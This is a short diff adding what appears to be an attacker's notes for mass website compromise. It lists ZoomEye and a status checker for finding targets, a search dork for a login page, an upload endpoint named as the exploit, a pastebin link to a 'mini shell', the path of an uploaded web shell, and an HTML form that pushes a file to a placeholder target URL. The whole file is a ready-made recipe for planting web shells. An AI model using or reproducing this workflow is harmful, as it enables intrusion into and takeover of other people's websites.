@@ -1,0 +1,23 @@
+PASTE >> https://www.zoomeye.org/
+ 
+HTTP STATUS >> https://httpstatus.io/
+ 
+DORK >> "div class=\"login_title_lineitem\">"
+ 
+Exploit > /uploadscript.php
+
+MINI SHELL >> https://pastebin.com/raw/qmTynmpz
+ 
+Shell Path> http://target.url/uploads/1245namashell.php
+ 
+CSRF HTML 
+ 
+<html>
+        <body>
+        <form action="LINK URL" method="POST" enctype="multipart/form-data" >
+        <input type="file" name="mp3_local"</p>
+        <input type="submit" value="Submit" />
+        </form>
+        </body>
+ 
+</html>
